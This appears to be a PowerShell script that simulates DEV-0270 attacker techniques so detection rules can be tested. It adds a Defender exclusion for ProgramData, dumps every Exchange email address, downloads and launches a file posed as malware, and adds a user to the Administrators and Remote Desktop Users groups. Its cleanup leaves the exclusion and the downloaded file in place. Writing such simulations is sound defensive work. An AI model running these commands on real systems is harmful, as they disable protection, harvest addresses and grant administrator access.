#Created for testing of Issue #356: Dev-0270 Malicious Powershell usage
Write-Host "Starting DEV-0270 PowerShell Simulation..." -ForegroundColor Cyan

# **Pattern 1: Add-MpPreference - Exclude ProgramData from Defender Scanning**
Write-Host "[+] Attempting to add Microsoft Defender exclusion for ProgramData..."
try {
    Add-MpPreference -ExclusionPath "C:\ProgramData"
} catch {
    Write-Host "[-] Failed to add exclusion" -ForegroundColor Yellow
}

Start-Sleep -Seconds 2  # Pause for logging

# **Pattern 2: Email Enumeration via Exchange Management Shell**
Write-Host "[+] Simulating Exchange email enumeration..."
try {
    Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
    Get-Recipient -ResultSize Unlimited | Select-Object -ExpandProperty EmailAddresses | ForEach-Object { $_.SmtpAddress }
} catch {
    Write-Host "[-] Exchange commands failed (likely due to missing snap-in)" -ForegroundColor Yellow
}

Start-Sleep -Seconds 2  # Pause for logging

# **Pattern 3: Fake Malware Download using Invoke-WebRequest**
Write-Host "[+] Simulating malicious file download using Invoke-WebRequest..."
$file = "$env:ProgramData\example-malware.exe"
Invoke-WebRequest -Uri "https://speed.hetzner.de/100MB.bin" -OutFile $file
Start-Process -FilePath "dllhost.exe" -ArgumentList "/c $file"

Start-Sleep -Seconds 2  # Pause for logging

# **Pattern 4: Add User to Administrators and RDP Users**
Write-Host "[+] Attempting to add a test user to Administrators and RDP Users groups..."
$user = "TestUser"
$admins = [System.Security.Principal.SecurityIdentifier]"S-1-5-32-544".Translate([System.Security.Principal.NTAccount]).Value
$rdp = [System.Security.Principal.SecurityIdentifier]"S-1-5-32-555".Translate([System.Security.Principal.NTAccount]).Value

# Add user to Administrators group
net localgroup Administrators $user /add
# Add user to Remote Desktop Users group
net localgroup "Remote Desktop Users" $user /add

Write-Host "Simulation Complete! Check DeviceProcessEvents logs." -ForegroundColor Green

# **Cleanup (Remove user from groups)**
Write-Host "[+] Cleaning up test environment..."
net localgroup Administrators $user /delete
net localgroup "Remote Desktop Users" $user /delete
Write-Host "Cleanup complete."

